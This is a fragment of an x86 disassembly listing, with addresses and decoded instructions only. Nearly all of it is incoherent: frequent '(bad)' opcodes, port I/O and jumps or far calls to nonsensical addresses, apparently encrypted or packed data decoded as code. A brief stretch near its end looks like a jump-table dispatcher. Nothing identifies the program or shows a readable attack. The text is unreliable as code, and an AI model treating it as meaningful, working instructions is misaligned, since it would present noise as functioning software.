  40a822:	ret    0x91ca
  40a825:	int    0xa6
  40a827:	add    DWORD PTR [eax],esi
  40a829:	jbe    0x40a857
  40a82b:	jecxz  0x40a881
  40a82d:	(bad)  
  40a82e:	fstp   DWORD PTR [ebx]
  40a830:	cwde   
  40a831:	inc    edx
  40a832:	imul   ebp,DWORD PTR [ebp-0x668c563a],0x3259b765
  40a83c:	pop    ds
  40a83d:	(bad)  
  40a83e:	les    esi,FWORD PTR ds:0x17712034
  40a844:	mov    esp,0xdba2ee81
  40a849:	test   DWORD PTR [eax-0x45],0xce52f832
  40a850:	mov    esp,0xbf724f15
  40a855:	mov    es:0x86b8985,al
  40a85b:	and    eax,0x6c956d67
  40a860:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a861:	mov    al,0x39
  40a863:	scas   eax,DWORD PTR es:[edi]
  40a864:	mov    al,ds:0x95fa7cf3
  40a869:	push   0x6f1d83ae
  40a86e:	cmp    edx,esi
  40a870:	dec    DWORD PTR [esi+0x11dde406]
  40a876:	pusha  
  40a877:	lock and bh,cl
  40a87a:	push   ebp
  40a87b:	loope  0x40a8ce
  40a87d:	xor    DWORD PTR [edi],esp
  40a87f:	jle    0x40a83b
  40a881:	std    
  40a882:	sub    DWORD PTR [edi-0x680ce41d],ecx
  40a888:	inc    eax
  40a889:	ins    DWORD PTR es:[edi],dx
  40a88a:	mov    ebp,0x657a3bff
  40a88f:	test   DWORD PTR [ebx+0x2a9d7ed1],0x72e2f9f8
  40a899:	pop    edx
  40a89a:	dec    edx
  40a89b:	jl     0x40a820
  40a89d:	mov    WORD PTR [ebx],ds
  40a89f:	jle    0x40a822
  40a8a1:	dec    ebp
  40a8a2:	stos   DWORD PTR es:[edi],eax
  40a8a3:	popa   
  40a8a4:	out    dx,al
  40a8a5:	mov    eax,esp
  40a8a7:	scas   eax,DWORD PTR es:[edi]
  40a8a8:	adc    al,0x85
  40a8aa:	test   BYTE PTR [eax-0x15e69872],0x52
  40a8b1:	sbb    DWORD PTR [edx+ebp*1-0x2e88fe3f],0x46761247
  40a8bc:	jb     0x40a8d4
  40a8be:	div    DWORD PTR [ebp-0x63a1619b]
  40a8c4:	(bad)  
  40a8c5:	js     0x40a92e
  40a8c7:	neg    ebp
  40a8c9:	add    al,0x56
  40a8cb:	or     ah,BYTE PTR [esi+0x34]
  40a8ce:	ds cmc 
  40a8d0:	mov    ebp,0x5e0d7ff0
  40a8d5:	sub    al,0x2a
  40a8d7:	(bad)  
  40a8d8:	cli    
  40a8d9:	xchg   ecx,eax
  40a8da:	inc    ebp
  40a8db:	jge    0x40a91c
  40a8dd:	jg     0x40a867
  40a8df:	jae    0x40a932
  40a8e1:	pop    ecx
  40a8e2:	leave  
  40a8e3:	stos   BYTE PTR es:[edi],al
  40a8e4:	mov    ch,0xa2
  40a8e6:	fwait
  40a8e7:	pop    ss
  40a8e8:	out    0xc9,al
  40a8ea:	outs   dx,BYTE PTR ds:[esi]
  40a8eb:	sub    BYTE PTR [edx-0x4dc7f595],dl
  40a8f1:	mov    eax,ds:0x10117439
  40a8f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a8f7:	(bad)  
  40a8f8:	outs   dx,BYTE PTR ds:[esi]
  40a8f9:	in     al,0x17
  40a8fb:	mov    bl,0xfc
  40a8fd:	in     al,dx
  40a8fe:	and    bl,BYTE PTR ds:0x15dfb6cb
  40a904:	sbb    cl,BYTE PTR ss:[ebx+0x3b]
  40a908:	iret   
  40a909:	xor    DWORD PTR [edi-0x469a64cc],ebx
  40a90f:	scas   al,BYTE PTR es:[edi]
  40a910:	inc    ebp
  40a911:	mov    eax,0x1fd083f3
  40a916:	pop    edx
  40a917:	push   es
  40a918:	and    DWORD PTR [edi],esi
  40a91a:	fimul  DWORD PTR [eax-0x1a9696ab]
  40a920:	dec    ecx
  40a921:	jbe    0x40a94f
  40a923:	pop    esi
  40a924:	or     al,0x23
  40a926:	lods   al,BYTE PTR gs:[esi]
  40a928:	mov    BYTE PTR [edx],ch
  40a92a:	xor    cl,BYTE PTR [edi-0x5e]
  40a92d:	xor    eax,0x94ae9abb
  40a932:	push   0xf0b97265
  40a937:	adc    DWORD PTR [edi],eax
  40a939:	fcmovbe st,st(3)
  40a93b:	lea    esp,[ecx-0x1e]
  40a93e:	call   0x71f3:0x3eb1f65d
  40a945:	mov    BYTE PTR [ebp-0x29],cl
  40a948:	mov    ebx,0xea7b2910
  40a94d:	dec    edi
  40a94e:	mov    bl,0x74
  40a950:	sahf   
  40a951:	test   DWORD PTR [ebx-0x53],ebx
  40a954:	jecxz  0x40a956
  40a956:	out    dx,al
  40a957:	mov    edi,0x1b615af3
  40a95c:	push   esp
  40a95d:	(bad)  
  40a95f:	in     eax,dx
  40a960:	inc    edx
  40a961:	xchg   DWORD PTR [esi],edx
  40a963:	test   al,0xf
  40a965:	in     eax,dx
  40a966:	lock mov cl,0x39
  40a969:	sbb    al,0x2d
  40a96b:	sbb    eax,0x30358c86
  40a970:	push   edi
  40a971:	loopne 0x40a97a
  40a973:	cs daa 
  40a975:	aaa    
  40a976:	arpl   WORD PTR [ecx-0x13],dx
  40a979:	pop    ds
  40a97a:	sbb    dh,BYTE PTR [edi+0xd]
  40a97d:	or     BYTE PTR [ebx+0x52],ch
  40a980:	xchg   edx,edi
  40a982:	push   esp
  40a983:	sbb    DWORD PTR [esi],ebp
  40a985:	rol    DWORD PTR [esi],1
  40a987:	in     eax,0xaa
  40a989:	mov    eax,0x9e6b07d8
  40a98e:	dec    edi
  40a98f:	lahf   
  40a990:	popf   
  40a991:	gs inc esi
  40a993:	xor    ecx,ecx
  40a995:	int    0xc2
  40a997:	je     0x40aa0c
  40a999:	xor    al,0x54
  40a99b:	jecxz  0x40a998
  40a99d:	enter  0xa6e4,0x53
  40a9a1:	(bad)  
  40a9a2:	fadd   DWORD PTR [ebx]
  40a9a4:	mov    bh,BYTE PTR [edx+edi*4+0x6]
  40a9a8:	mov    eax,0xeeb0247b
  40a9ad:	xchg   edx,eax
  40a9ae:	fs ins DWORD PTR es:[edi],dx
  40a9b0:	sbb    BYTE PTR [esi],bl
  40a9b2:	scas   al,BYTE PTR es:[edi]
  40a9b3:	aad    0xc8
  40a9b5:	outs   dx,DWORD PTR ds:[esi]
  40a9b6:	sbb    DWORD PTR [edi-0x7a4d4265],edi
  40a9bc:	add    eax,0x1ff29d6f
  40a9c1:	mov    ebp,DWORD PTR [ecx+0x79d3742]
  40a9c7:	or     bl,BYTE PTR [ecx-0x2c3bb322]
  40a9cd:	out    0xee,al
  40a9cf:	repz jge 0x40a998
  40a9d2:	add    dl,BYTE PTR ds:0x8ea06a2c
  40a9d8:	sub    DWORD PTR [edx-0x338c1345],0x164aa2a0
  40a9e2:	xchg   ecx,eax
  40a9e3:	add    DWORD PTR ds:0xcd2e7828,esi
  40a9e9:	mov    bl,0x4d
  40a9eb:	out    0xb4,al
  40a9ed:	pop    ds
  40a9ee:	cmp    BYTE PTR [ecx],cl
  40a9f0:	push   esp
  40a9f1:	cdq    
  40a9f2:	(bad)
  40a9f5:	jne    0x40a9fd
  40a9f7:	rcl    BYTE PTR [ecx-0x1],0xe9
  40a9fb:	addr16 adc dh,bh
  40a9fe:	sahf   
  40a9ff:	(bad)  [edi]
  40aa01:	aaa    
  40aa02:	xor    DWORD PTR [eax-0x44fe45fb],edx
  40aa08:	into   
  40aa09:	adc    al,0xfb
  40aa0b:	xor    eax,ebx
  40aa0d:	pop    ecx
  40aa0e:	daa    
  40aa0f:	cwde   
  40aa10:	shl    DWORD PTR [eax+0x2a9ac5b8],cl
  40aa16:	(bad)  [eax]
  40aa18:	loope  0x40aa0c
  40aa1a:	jns    0x40aa0f
  40aa1c:	lock and edi,DWORD PTR [eax+0x55]
  40aa20:	rol    ebx,1
  40aa22:	ja     0x40aa85
  40aa24:	xchg   esi,eax
  40aa25:	or     DWORD PTR [eax+0x511f6fe9],edx
  40aa2b:	sbb    ebp,DWORD PTR [ebp+0x5ec25fd4]
  40aa31:	mov    eax,ds:0x1ebb7751
  40aa36:	bsf    ebx,ebp
  40aa39:	ror    DWORD PTR ds:0x67c2e273,cl
  40aa3f:	std    
  40aa40:	pop    eax
  40aa41:	jns    0x40aa99
  40aa43:	sub    ebp,DWORD PTR [edx]
  40aa45:	in     eax,dx
  40aa46:	jno    0x40aa48
  40aa48:	xchg   edx,eax
  40aa49:	retf   
  40aa4a:	xor    BYTE PTR [eiz*8+0x7af24787],0x98
  40aa52:	mov    ds:0x5f0f4739,eax
  40aa57:	xlat   BYTE PTR ds:[ebx]
  40aa58:	inc    esp
  40aa59:	fld    QWORD PTR [edi+0x79]
  40aa5c:	icebp  
  40aa5d:	xlat   BYTE PTR ds:[ebx]
  40aa5e:	pop    ebp
  40aa5f:	enter  0x8d80,0x78
  40aa63:	fstp   TBYTE PTR [ecx]
  40aa65:	jne    0x40aad3
  40aa67:	iret   
  40aa68:	mov    ebp,0xd4ce1b2f
  40aa6d:	call   0xe1ec5269
  40aa72:	dec    ecx
  40aa73:	test   eax,0xa3f2033f
  40aa78:	adc    eax,0x26e422cb
  40aa7d:	fmul   QWORD PTR [ebx+0x3a]
  40aa80:	jae    0x40aae2
  40aa82:	fidiv  DWORD PTR [ecx+0x7eda5710]
  40aa88:	jle    0x40aacd
  40aa8a:	outs   dx,BYTE PTR ds:[esi]
  40aa8b:	sbb    BYTE PTR [ebp+0x69],dl
  40aa8e:	cmp    bl,bl
  40aa90:	shl    cl,1
  40aa92:	sbb    eax,0xdf2b60af
  40aa97:	outs   dx,DWORD PTR ds:[esi]
  40aa98:	mov    BYTE PTR [esp+edx*4],cl
  40aa9b:	idiv   DWORD PTR ds:[ebx-0x37d0c959]
  40aaa2:	fst    QWORD PTR [edx+0x12]
  40aaa5:	mov    eax,ds:0xe449046f
  40aaaa:	mov    eax,esi
  40aaac:	or     BYTE PTR ds:0xa02fdd56,al
  40aab2:	aam    0x87
  40aab4:	lods   eax,DWORD PTR ds:[esi]
  40aab5:	fcomp  DWORD PTR [eax+esi*2+0x6e]
  40aab9:	dec    edi
  40aaba:	push   0xfffffff3
  40aabc:	jp     0x40aac2
  40aabe:	js     0x40aa5a
  40aac0:	mov    edx,ebx
  40aac2:	cwde   
  40aac3:	and    ecx,ebx
  40aac5:	mov    ds:0xb1fef05d,al
  40aaca:	je     0x40ab0a
  40aacc:	fadd   st(5),st
  40aace:	pop    ebp
  40aacf:	aad    0x9f
  40aad1:	mov    eax,ds:0xa27db28a
  40aad6:	js     0x40aa6a
  40aad8:	unpckhps xmm7,XMMWORD PTR [edi+0x64]
  40aadc:	cmp    BYTE PTR [esi],dh
  40aade:	mov    ds:0x2715cc51,eax
  40aae3:	xchg   ebx,eax
  40aae4:	pop    ecx
  40aae5:	jno    0x40aace
  40aae7:	lock cmp esp,ebx
  40aaea:	dec    eax
  40aaeb:	cmp    DWORD PTR [edx],0x4f
  40aaee:	mov    WORD PTR [ebx-0x6c1de66e],gs
  40aaf4:	xchg   BYTE PTR [esi],ch
  40aaf6:	lods   eax,DWORD PTR ds:[esi]
  40aaf7:	mov    eax,0x33cde23a
  40aafc:	shl    DWORD PTR [edi+eiz*8-0xfc09e3],1
  40ab03:	push   ecx
  40ab04:	inc    eax
  40ab05:	push   ds
  40ab06:	fmul   QWORD PTR [edi+eax*4]
  40ab09:	addr16 loope 0x40ab73
  40ab0c:	popf   
  40ab0d:	adc    eax,0x8dae7047
  40ab12:	mov    dl,0xa2
  40ab14:	adc    BYTE PTR [esi],ch
  40ab16:	out    0xd9,al
  40ab18:	ds dec ebp
  40ab1a:	pushf  
  40ab1b:	mov    esi,0x90cc881a
  40ab20:	(bad)  
  40ab21:	jmp    0x40ab48
  40ab23:	xor    al,0xa2
  40ab25:	sbb    edx,esi
  40ab27:	mov    ecx,0xe947c0e7
  40ab2c:	clc    
  40ab2d:	lds    ebx,FWORD PTR [ebx]
  40ab2f:	sbb    DWORD PTR [edx+eax*8],0x6
  40ab33:	mov    al,0x8e
  40ab35:	pop    ecx
  40ab36:	cmp    dl,BYTE PTR [ebx+0x6f9eed20]
  40ab3c:	shl    DWORD PTR ds:0xfbf6a656,cl
  40ab42:	jle    0x40abc1
  40ab44:	mov    esp,0xd45c65fb
  40ab49:	lock jne 0x40ab73
  40ab4c:	bound  esp,QWORD PTR [ecx+0x7f]
  40ab4f:	mov    esp,0xa9965233
  40ab54:	xchg   esi,eax
  40ab55:	mov    cl,0x64
  40ab57:	lea    esi,[esi+0x56d7459b]
  40ab5d:	xchg   edx,eax
  40ab5e:	sbb    esp,DWORD PTR [edi-0x72]
  40ab61:	sbb    ebp,DWORD PTR [edi+0x326295f3]
  40ab67:	fistp  WORD PTR [esi]
  40ab69:	fs add eax,0xbcbe95ff
  40ab6f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ab70:	fcomp  QWORD PTR [edx+0x9]
  40ab73:	adc    ebp,ecx
  40ab75:	addr16 lock xchg edi,eax
  40ab78:	mov    al,ds:0xdeb985e
  40ab7d:	in     al,0xcb
  40ab7f:	add    DWORD PTR [edi+ecx*1+0x18],esp
  40ab83:	and    BYTE PTR [eax+0x1a9dad12],dh
  40ab89:	loope  0x40abf0
  40ab8b:	sbb    DWORD PTR [esi+0x76],ebp
  40ab8e:	bound  cx,DWORD PTR [eax-0x716f6cd0]
  40ab95:	add    al,0x58
  40ab97:	inc    eax
  40ab98:	stos   BYTE PTR es:[edi],al
  40ab99:	stos   DWORD PTR es:[edi],eax
  40ab9a:	push   ebx
  40ab9b:	push   esp
  40ab9c:	sub    al,0x8b
  40ab9e:	(bad)  
  40ab9f:	pop    esp
  40aba0:	lds    esi,FWORD PTR [ecx]
  40aba2:	add    al,al
  40aba4:	inc    eax
  40aba5:	xor    BYTE PTR [edx+eax*2+0x78],ah
  40aba9:	in     al,dx
  40abaa:	rcr    edi,cl
  40abac:	sub    eax,0x517b52df
  40abb1:	add    al,0xf2
  40abb3:	in     al,dx
  40abb4:	mov    WORD PTR [ebx],ds
  40abb6:	sub    dh,dl
  40abb8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40abb9:	ret    0xa225
  40abbc:	mov    edx,0x2b47e634
  40abc1:	out    0x5f,al
  40abc3:	jg     0x40abdd
  40abc5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40abc6:	jbe    0xcc64fa9b
  40abcc:	mov    ebp,0xfb35f732
  40abd1:	imul   esi,DWORD PTR [ebp-0x433f5357],0xffffffa4
  40abd8:	(bad)  
  40abd9:	rol    BYTE PTR [ebx-0x68],0x52
  40abdd:	mov    esp,0x886b8a93
  40abe2:	sar    BYTE PTR [eax],1
  40abe4:	and    DWORD PTR [edx-0x23],ebx
  40abe7:	neg    dl
  40abe9:	aaa    
  40abea:	mov    ch,0x89
  40abec:	loopne 0x40ab82
  40abee:	stc    
  40abef:	xor    bh,dl
  40abf1:	in     eax,dx
  40abf2:	sbb    DWORD PTR [ebp-0x3e],ebx
  40abf5:	pop    ebx
  40abf6:	dec    ebx
  40abf7:	cmp    DWORD PTR [edx+0x4a],esi
  40abfa:	dec    esp
  40abfc:	lods   al,BYTE PTR ds:[esi]
  40abfd:	pop    ecx
  40abfe:	arpl   si,sp
  40ac00:	(bad)  
  40ac01:	fwait
  40ac02:	clc    
  40ac03:	fnstsw WORD PTR [esi+0x2a4545bf]
  40ac09:	mov    ebx,0x2a0f8985
  40ac0e:	int3   
  40ac0f:	xchg   ecx,eax
  40ac10:	(bad)  
  40ac11:	cmp    al,0x1b
  40ac13:	mov    ds:0xcaf6d3d3,eax
  40ac18:	cmp    BYTE PTR [edi+0x15],bh
  40ac1b:	cmp    bl,bh
  40ac1d:	add    BYTE PTR [esi+esi*4-0x19],al
  40ac21:	call   0xee2c4c01
  40ac26:	cmp    bh,ah
  40ac28:	push   eax
  40ac29:	sti    
  40ac2a:	dec    edx
  40ac2b:	xchg   edx,eax
  40ac2c:	mov    ah,0x94
  40ac2e:	adc    DWORD PTR [edx-0x54ca9d33],ecx
  40ac34:	mov    bl,0x92
  40ac36:	mov    edi,0xfd0e8922
  40ac3b:	lea    eax,[edi-0x71]
  40ac3e:	dec    ebx
  40ac3f:	push   ecx
  40ac40:	push   ebx
  40ac41:	push   0x25702ac1
  40ac46:	imul   eax,DWORD PTR [ecx+0x33ba04bb],0x4e13274c
  40ac50:	fstp   DWORD PTR [esi+eiz*4]
  40ac53:	jmp    FWORD PTR [edi]
  40ac55:	loope  0x40abe9
  40ac57:	pusha  
  40ac58:	cmp    BYTE PTR [edx],dh
  40ac5a:	(bad)  
  40ac5b:	cmp    ecx,DWORD PTR [edx]
  40ac5d:	pop    edx
  40ac5e:	lods   eax,DWORD PTR ds:[esi]
  40ac5f:	in     eax,dx
  40ac60:	outs   dx,DWORD PTR ds:[esi]
  40ac61:	sub    al,0x87
  40ac63:	cli    
  40ac64:	(bad)  
  40ac65:	inc    esi
  40ac66:	inc    edx
  40ac67:	or     al,0xf9
  40ac69:	dec    ebx
  40ac6a:	in     al,0xfb
  40ac6c:	lea    ecx,gs:[eax]
  40ac6f:	pop    edi
  40ac70:	adc    eax,0xa1a856e4
  40ac75:	(bad)  
  40ac76:	pop    es
  40ac77:	inc    esi
  40ac78:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ac79:	cdq    
  40ac7a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ac7b:	inc    edi
  40ac7c:	cmp    BYTE PTR [eax-0x4e8e4511],0x3
  40ac83:	daa    
  40ac84:	and    eax,0xb13b587d
  40ac89:	loope  0x40ac48
  40ac8b:	inc    DWORD PTR [ebx+0x12640519]
  40ac91:	out    0x9a,eax
  40ac93:	test   al,0xc4
  40ac95:	inc    ebp
  40ac96:	nop
  40ac97:	inc    ebx
  40ac98:	inc    esi
  40ac99:	push   ss
  40ac9a:	(bad)  
  40ac9b:	in     al,dx
  40ac9c:	cmp    eax,0x4856550b
  40aca1:	jmp    0x5387:0x1af06e35
  40aca8:	ins    BYTE PTR es:[edi],dx
  40aca9:	(bad)  
  40acaa:	in     al,dx
  40acab:	arpl   cx,ax
  40acad:	es xchg ecx,eax
  40acaf:	(bad)  
  40acb0:	and    eax,0x82afac43
  40acb5:	ja     0x40ac70
  40acb7:	xchg   DWORD PTR [edx],ecx
  40acb9:	dec    ebx
  40acba:	data16 ja 0x40ac7e
  40acbd:	adc    ebp,DWORD PTR [edi-0x7335cc69]
  40acc3:	outs   dx,DWORD PTR ds:[esi]
  40acc4:	es test eax,0x8752d521
  40acca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40accb:	sar    dh,cl
  40accd:	dec    ebx
  40acce:	pusha  
  40accf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40acd0:	nop
  40acd1:	mov    ecx,0x1e4b8ed7
  40acd6:	aaa    
  40acd7:	xchg   edi,eax
  40acd8:	nop
  40acd9:	xchg   edx,eax
  40acda:	dec    edx
  40acdb:	jl     0x40ad23
  40acdd:	mov    ds:0xcb080322,eax
  40ace2:	pop    edi
  40ace3:	push   ss
  40ace4:	icebp  
  40ace5:	jle    0x40accb
  40ace7:	dec    ebp
  40ace8:	xchg   edi,eax
  40ace9:	mov    cl,0x24
  40aceb:	scas   al,BYTE PTR es:[edi]
  40acec:	mov    esi,edx
  40acee:	ror    BYTE PTR [esi+0x7d],0x58
  40acf2:	cdq    
  40acf3:	test   al,0x5f
  40acf5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40acf6:	adc    dh,BYTE PTR ds:0x15f6
  40acfb:	les    eax,FWORD PTR [edx+0x26]
  40acfe:	out    0x2b,al
  40ad00:	and    al,0x9b
  40ad02:	ficom  DWORD PTR [ebx+0x70c5ee99]
  40ad08:	ja     0x40ad5e
  40ad0a:	mov    esi,0xb2718ba7
  40ad0f:	pop    ds
  40ad10:	pop    ebp
  40ad11:	popf   
  40ad12:	hlt    
  40ad13:	xor    al,0x68
  40ad15:	data16 fs int 0x55
  40ad19:	xchg   esp,edi
  40ad1b:	xchg   dl,bh
  40ad1d:	fstp   st(6)
  40ad1f:	mov    bh,0x4d
  40ad21:	cs nop
  40ad23:	cmp    eax,0x6e
  40ad26:	cmp    DWORD PTR [esi+0x4be04dfb],ecx
  40ad2c:	std    
  40ad2d:	jg     0x40ad86
  40ad2f:	repnz fimul WORD PTR [eax+0x645aa4d8]
  40ad36:	scas   al,BYTE PTR es:[edi]
  40ad37:	jo     0x40ad87
  40ad39:	dec    edx
  40ad3a:	fisttp DWORD PTR [esi+eiz*4]
  40ad3d:	rcl    DWORD PTR [ecx+0x73],0x49
  40ad41:	mov    bh,0xb2
  40ad43:	add    eax,0x502b180d
  40ad48:	xchg   esi,eax
  40ad49:	stc    
  40ad4a:	fidiv  WORD PTR [edi+0x3012f0b8]
  40ad50:	or     BYTE PTR [edx],cl
  40ad52:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ad53:	pop    es
  40ad54:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ad55:	daa    
  40ad56:	js     0x40ad21
  40ad58:	mov    ds:0x1f6362aa,eax
  40ad5d:	push   eax
  40ad5e:	mov    WORD PTR [ecx-0x51],?
  40ad61:	in     al,dx
  40ad62:	(bad)  
  40ad63:	and    BYTE PTR [edx],dl
  40ad65:	sbb    ecx,eax
  40ad67:	loope  0x40ade5
  40ad69:	sub    DWORD PTR [ebx],ecx
  40ad6b:	or     edi,DWORD PTR [edx+0x64]
  40ad6e:	test   BYTE PTR [eax+0xb4b6c7f],ch
  40ad74:	mov    es,WORD PTR [ebp-0x4d]
  40ad77:	jle    0x40adb3
  40ad79:	sbb    esi,DWORD PTR [edi+0x59]
  40ad7c:	jb     0x40adc1
  40ad7e:	das    
  40ad7f:	rol    BYTE PTR [esp+ebx*4],cl
  40ad82:	jno    0x40ad6c
  40ad84:	push   ds
  40ad85:	push   es
  40ad86:	int    0x1
  40ad88:	xchg   edx,eax
  40ad89:	(bad)  
  40ad8a:	aam    0x22
  40ad8c:	fcmovnbe st,st(6)
  40ad8e:	cmp    BYTE PTR [ebx+ebp*1+0x2d0fe42a],dh
  40ad95:	jl     0x40adb0
  40ad97:	mov    eax,0x7bed3d19
  40ad9c:	push   ebp
  40ad9d:	std    
  40ad9e:	mov    WORD PTR [ecx-0x7a],?
  40ada1:	cwde   
  40ada2:	mov    eax,ds:0x4694fcee
  40ada7:	mov    edi,0x9d816c3b
  40adac:	add    esp,DWORD PTR [ebx-0x3]
  40adaf:	mov    cl,0x48
  40adb1:	mov    DWORD PTR [edx-0x18],ecx
  40adb4:	push   cs
  40adb5:	mov    dl,0x11
  40adb7:	or     DWORD PTR [ebx+0x71],esi
  40adba:	dec    ecx
  40adbb:	push   esi
  40adbc:	xchg   ebx,eax
  40adbd:	into   
  40adbe:	(bad)  
  40adbf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40adc0:	icebp  
  40adc1:	cs nop
  40adc3:	xrelease xchg DWORD PTR [edi],ebx
  40adc6:	jmp    FWORD PTR [eax]
  40adc8:	outs   dx,BYTE PTR ds:[esi]
  40adc9:	inc    edi
  40adca:	adc    ebp,DWORD PTR [ecx-0x70]
  40adcd:	xchg   DWORD PTR [eax+0x69],ebp
  40add0:	sahf   
  40add1:	push   ss
  40add2:	mov    edi,0x166e4c73
  40add7:	xchg   esp,eax
  40add8:	mov    al,ds:0x712ea518
  40addd:	fimul  WORD PTR [eax]
  40addf:	dec    edx
  40ade0:	push   0xd
  40ade2:	push   eax
  40ade3:	lods   al,BYTE PTR ds:[esi]
  40ade4:	mov    ds:0x8ae5f90,al
  40ade9:	aad    0x7f
  40adeb:	sub    ebp,0xef7524cb
  40adf1:	mov    ss:0x70c0b376,eax
  40adf7:	sub    eax,0x9044aa9c
  40adfc:	cmp    al,0xcf
  40adfe:	arpl   WORD PTR [ecx-0x2],ax
  40ae01:	jmp    0xdec93dc7
  40ae06:	xchg   ecx,eax
  40ae07:	xor    DWORD PTR [edi+0x76],0xfffffff4
  40ae0b:	sbb    al,0x75
  40ae0d:	cs aam 0x1d
  40ae10:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ae11:	cmp    bh,BYTE PTR [ebx+0x2d]
  40ae14:	mov    ds:0xa19fdeff,eax
  40ae19:	xchg   BYTE PTR [edi],dh
  40ae1b:	adc    DWORD PTR [ebx+0x30],ecx
  40ae1e:	sub    ebp,edx
  40ae20:	imul   edi,DWORD PTR [edi-0x553298a],0xbeaa9630
  40ae2a:	jb     0x40adca
  40ae2c:	nop
  40ae2d:	das    
  40ae2e:	jle    0x40adb8
  40ae30:	jmp    0xe1856aaa
  40ae35:	or     DWORD PTR [edi],ebp
  40ae37:	add    DWORD PTR [edx],ecx
  40ae39:	(bad)  
  40ae3a:	push   edx
  40ae3b:	dec    ebx
  40ae3c:	mov    esi,0x2bd22e11
  40ae41:	inc    edi
  40ae42:	into   
  40ae43:	xchg   ebp,eax
  40ae44:	dec    edi
  40ae45:	sar    DWORD PTR [edx+0x1e],0xf0
  40ae49:	popf   
  40ae4a:	(bad)  
  40ae4b:	arpl   ax,di
  40ae4d:	(bad)  
  40ae4f:	inc    eax
  40ae50:	retf   0xb6a6
  40ae53:	lods   eax,DWORD PTR ds:[esi]
  40ae54:	sti    
  40ae55:	ins    BYTE PTR es:[di],dx
  40ae57:	fstp   st(4)
  40ae59:	adc    ah,al
  40ae5b:	je     0x40ae9a
  40ae5d:	(bad)  
  40ae5e:	jae    0x40aec2
  40ae60:	shl    DWORD PTR [edi+0x79a227f6],1
  40ae66:	jmp    0x40aeaa
  40ae68:	fbld   TBYTE PTR [ebx+0x1059f967]
  40ae6e:	fld    TBYTE PTR [eax-0x4722793]
  40ae74:	ret    
  40ae75:	push   ss
  40ae76:	clc    
  40ae77:	pop    edi
  40ae78:	mov    WORD PTR [ecx+0x4e],es
  40ae7b:	add    esi,DWORD PTR [edx+0x62fdff2e]
  40ae81:	adc    al,0xf9
  40ae83:	mov    eax,0xe13936f3
  40ae88:	dec    esi
  40ae89:	in     eax,0xe1
  40ae8b:	in     al,dx
  40ae8c:	dec    eax
  40ae8d:	xchg   edi,eax
  40ae8e:	sub    DWORD PTR [ebp-0x4bec68cd],0xffffffbf
  40ae95:	loopne 0x40af0c
  40ae97:	mov    esp,0x67ac050f
  40ae9c:	pushf  
  40ae9d:	jmp    0xe284:0x30bd67b9
  40aea4:	fiadd  WORD PTR [ebx]
  40aea6:	xchg   ebp,eax
  40aea7:	gs pop edi
  40aea9:	loop   0x40af0b
  40aeab:	movzx  eax,WORD PTR [eax+ebx*2]
  40aeaf:	mov    ecx,DWORD PTR [ebp-0x14]
  40aeb2:	mov    eax,DWORD PTR [ecx+eax*4]
  40aeb5:	mov    DWORD PTR [ebp-0x38],eax
  40aeb8:	jmp    0x408aae
  40aebd:	mov    eax,DWORD PTR [ebp-0xc]
  40aec0:	xor    eax,esi
  40aec2:	lea    ebx,[ebx+eax*1+0x3272fa]
  40aec9:	jmp    0x4087a7
  40aece:	mov    eax,DWORD PTR [ebp-0x4]
  40aed1:	xor    eax,esi
  40aed3:	add    eax,edi
  40aed5:	jmp    0x40d3b1
  40aeda:	mov    eax,DWORD PTR [ebp-0x38]
  40aedd:	add    eax,DWORD PTR [ebp+0x8]
  40aee0:	mov    DWORD PTR [ebp-0x18],eax
  40aee3:	jmp    0x40d298
  40aee8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aee9:	fisubr WORD PTR [esi]
  40aeeb:	jbe    0x40af63
  40aeed:	jbe    0x40aed6
  40aeef:	outs   dx,BYTE PTR ds:[esi]
  40aef0:	xchg   BYTE PTR [ebx+0x6790a730],al
  40aef6:	cli    
  40aef7:	fadd   DWORD PTR [edx+0x137b7b09]
  40aefd:	pushf  
  40aefe:	jnp    0x40af7b
  40af00:	pushw  ss
  40af02:	jnp    0x40af7d
  40af04:	cld    
  40af05:	lea    eax,[ecx]
  40af07:	fst    QWORD PTR [edx+eax*4-0xa0e2b44]
  40af0e:	hlt    
  40af0f:	cmp    DWORD PTR [eax+0x75],0xc45ffb0c
  40af16:	xchg   edx,eax
  40af17:	cmp    ch,BYTE PTR [ebp+0x116eab7b]
  40af1d:	dec    esi
  40af1e:	test   eax,0x633338a3
  40af23:	xchg   esp,eax
  40af24:	xchg   DWORD PTR [edi],esi
  40af26:	adc    BYTE PTR [edi],bl
  40af28:	mov    ds:0x556d6ab5,eax
  40af2d:	or     ebp,DWORD PTR [ebp-0x31]
  40af30:	inc    ecx
  40af31:	dec    esi
  40af32:	jnp    0x40af64
  40af34:	push   es
  40af35:	inc    edi
  40af36:	stc    
  40af37:	cmc    
  40af38:	or     ecx,edi
  40af3a:	fwait
  40af3b:	mov    ah,0x39
  40af3d:	scas   eax,DWORD PTR es:[edi]
  40af3e:	xor    al,0xcb
  40af40:	outs   dx,DWORD PTR ds:[esi]
  40af41:	lock dec esp
  40af43:	clc    
  40af44:	(bad)  
  40af45:	lock in eax,0x74
  40af48:	xor    BYTE PTR [edi+0x48cc50b9],dl
  40af4e:	or     BYTE PTR [esp+edx*2+0x1ac0e5c0],dl
  40af55:	repz push edx
  40af57:	xor    al,0x9c
  40af59:	retf   
  40af5a:	test   ecx,0x789c37a3
  40af60:	add    BYTE PTR [edi-0x4f44226f],cl
  40af66:	int3   
  40af67:	imul   BYTE PTR [ebp-0x68848c49]
  40af6d:	mov    ds:0x26202ba4,al
  40af72:	dec    esp
  40af73:	xlat   BYTE PTR ds:[ebx]
  40af74:	cli    
  40af75:	fld    TBYTE PTR [edi]
  40af77:	cmp    DWORD PTR [ecx],ebx
